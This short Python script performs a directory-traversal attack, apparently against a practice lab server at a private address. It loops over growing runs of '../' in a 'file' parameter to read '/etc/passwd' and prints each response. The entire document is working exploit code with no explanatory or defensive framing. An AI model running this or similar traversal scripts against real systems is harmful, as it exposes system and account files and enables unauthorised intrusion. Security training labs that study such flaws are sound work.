import urllib.parse
import urllib.request
import lxml.html as lh


passwd = "etc/passwd"

for x in range(1,10):
	url = "http://10.0.1.14/dirtrav/example2.php?file=/var/www/files/"+"../"*x+passwd
	print(url)
	with urllib.request.urlopen(url) as reponse:
		content = reponse.read()
	print(content)

